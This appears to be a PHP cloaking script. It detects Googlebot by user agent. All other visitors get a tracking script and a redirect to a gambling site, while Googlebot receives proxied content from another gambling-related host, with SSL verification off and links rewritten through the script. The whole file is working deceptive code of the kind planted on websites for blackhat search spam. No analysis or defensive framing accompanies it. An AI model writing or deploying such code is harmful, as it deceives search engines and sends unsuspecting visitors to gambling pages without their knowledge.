<?php
// 低版本PHP
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); // 过期时间设为过去

function getClientIp() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP']; // 代理情况下的客户端 IP
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR']; // 经过多个代理服务器时的 IP
    } else {
        return $_SERVER['REMOTE_ADDR']; // 默认的客户端 IP
    }
}

function trackTrafficAndRedirect($redirectUrl) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Redirecting...</title>
    </head>
    <body>
    <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
    <script>
        function waitForLaSdk(callback) {
            if (typeof LA !== 'undefined' && typeof LA.init === 'function') {
                callback();
            } else {
                setTimeout(function() {
                    waitForLaSdk(callback);
                }, 100);
            }
        }
        waitForLaSdk(function() {
            LA.init({ id: "3KiEXSxInJxzmfOY", ck: "3KiEXSxInJxzmfOY" });
            window.location.href = "<?= $redirectUrl ?>";
        });
    </script>
    <p>If you are not redirected automatically, follow this <a href="<?= $redirectUrl ?>">link</a>.</p>
    </body>
    </html>
    <?php
}

// 获取客户端 IP 地址
$client_ip = getClientIp();
try {
    if (empty($_SERVER['HTTP_USER_AGENT']) || stripos($_SERVER['HTTP_USER_AGENT'], 'googlebot') === false) {
        trackTrafficAndRedirect("https://www.vegas33d.top/normal/?cid=706366&fb_dynamic_pixel=33d");
        exit;
    }

    $targetHost = "ComeOn.ht04.co";
    $targetUrl = "http://{$targetHost}" . (isset($_GET['q']) ? $_GET['q'] : "/");    // 可能需要改

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $targetUrl,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER         => false,
        CURLOPT_CUSTOMREQUEST  => $_SERVER['REQUEST_METHOD'],
        CURLOPT_HTTP_VERSION   => CURL_HTTP_VERSION_1_1,
        CURLOPT_HTTPHEADER     => array_filter([
            "Host: {$targetHost}",
            "X-Real-IP: {$_SERVER['REMOTE_ADDR']}",
            "X-Forwarded-For: " . (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']),    // 可能需要改
            !empty($_SERVER['HTTP_USER_AGENT']) ? "User-Agent: {$_SERVER['HTTP_USER_AGENT']}" : null,
            !empty($_SERVER['HTTP_ACCEPT']) ? "Accept: {$_SERVER['HTTP_ACCEPT']}" : null,
            !empty($_SERVER['HTTP_REFERER']) ? "Referer: {$_SERVER['HTTP_REFERER']}" : null,
        ]),
        // 禁用 SSL 证书验证
        CURLOPT_FOLLOWLOCATION => true,  // 启用重定向跟随
        CURLOPT_SSL_VERIFYPEER => false,  // 跳过 SSL 证书验证
        CURLOPT_SSL_VERIFYHOST => false   // 跳过 SSL 主机验证
    ]);

    if (in_array($_SERVER['REQUEST_METHOD'], ["POST", "PUT"])) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents('php://input'));
    }

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);

    // 处理 301 重定向
    if ($httpCode == 301 || $httpCode == 302) {
        // 获取重定向 URL
        $redirectUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        // 继续请求重定向的 URL
        header("Location: $redirectUrl", true, $httpCode);
        exit;
    }
    http_response_code($httpCode);
    header("Content-Type: {$contentType}");

    echo (stripos($contentType, "text/html") !== false) ? fixRelativePaths($response) : $response;
} catch (Exception $ex) {
    http_response_code(500);
    header("Content-Type: text/plain");
    echo "Exception: " . $ex->getMessage();
}

function fixRelativePaths($html) {
    // Get the current script name
    $currentScript = basename($_SERVER['SCRIPT_NAME']);
    
    // Replace the hardcoded "nn.php" with the current script name
    return preg_replace('/(href|src)=["\'](\/[^"\']+)["\']/i', '$1="' . $currentScript . '?q=$2"', $html);
}
?>
